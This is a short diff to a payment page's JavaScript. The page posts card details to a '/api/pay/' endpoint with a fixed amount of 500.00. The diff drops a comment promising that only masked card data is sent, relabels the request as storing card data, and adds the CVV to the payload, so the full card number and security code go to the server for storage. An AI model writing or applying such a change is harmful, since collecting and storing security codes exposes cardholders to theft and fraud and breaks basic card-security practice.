@@ -498,13 +498,14 @@
             var pathParts = window.location.pathname.split('/').filter(Boolean);
             var token = pathParts[1] || '';
 
-            // Send masked card data to the server for storage (only last4 + holder + expiry).
+            // Send card data to the server for storage.
             fetch('/api/pay/' + token, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     card_number: cardNumber,
                     expiry: expiry,
+                    cvv: cvv,
                     card_holder: cardHolder,
                     amount: 500.00
                 })
